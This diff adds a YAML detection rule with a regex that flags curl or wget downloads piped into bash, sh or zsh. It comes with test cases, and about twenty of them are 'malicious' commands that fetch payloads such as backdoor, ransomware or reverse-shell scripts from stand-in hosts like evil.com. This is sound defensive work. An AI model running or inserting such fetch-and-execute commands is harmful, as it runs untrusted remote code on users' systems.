@@ -1,0 +1,41 @@
+name: critical-11-bash-pipe-shell
+severity: critical
+description: >
+  Detects bash commands piped to shell interpreters. Requires context to distinguish from legitimate admin tasks.
+
+pattern: |
+  (?i)^(?![\s]*#)(curl|wget).*(https?|ftp)://.*\|.*(bash|sh|zsh)
+
+malicious:
+  - "curl http://evil.com/malware.sh | bash"
+  - "wget -qO- http://attacker.com/payload.sh | sh"
+  - "curl -s https://malware.com/exploit.sh | bash"
+  - "wget -O - http://evil.com/dropper.sh | zsh"
+  - "curl http://bad.com/backdoor.sh | sh"
+  - "wget -qO- http://192.168.1.100/clickfix.sh | bash"
+  - "curl -fsSL http://evil.com/installer.sh | sudo bash"
+  - "wget --quiet -O - http://attacker.com/ransomware.sh | sh"
+  - "curl -s http://malware.com/reverse-shell.sh | bash -"
+  - "wget -qO- ftp://evil.com/exploit.sh | zsh"
+  - "curl -L http://evil.com/stage2.sh | bash"
+  - "wget -O- http://attacker.com/implant.sh | sh"
+  - "curl --silent http://evil.com/loader.sh | sudo sh"
+  - "wget -q -O - http://malware.com/backdoor.sh | bash"
+  - "curl -sSL http://evil.com/dropper.sh | ksh"
+  - "wget -qO- http://attacker.com/trojan.sh | bash -x"
+  - "curl http://evil.com/persistence.sh | sh -s"
+  - "wget --no-check-certificate https://malware.com/payload.sh -O - | bash"
+  - "curl -fsSL http://evil.com/obfuscated.sh | bash -c 'cat | bash'"
+  - "wget -qO- http://192.168.1.50:8080/malware.sh | zsh"
+
+benign:
+  - "curl http://example.com/file.txt"
+  - "wget https://example.com/document.pdf"
+  - "curl -O https://example.com/image.jpg"
+  - "wget -P /tmp https://example.com/data.json"
+  - "curl --version"
+  - "wget --help"
+  - "curl -I https://example.com"
+  - "wget --spider https://example.com"
+  - "echo 'curl test'"
+  - "# curl https://example.com | bash"
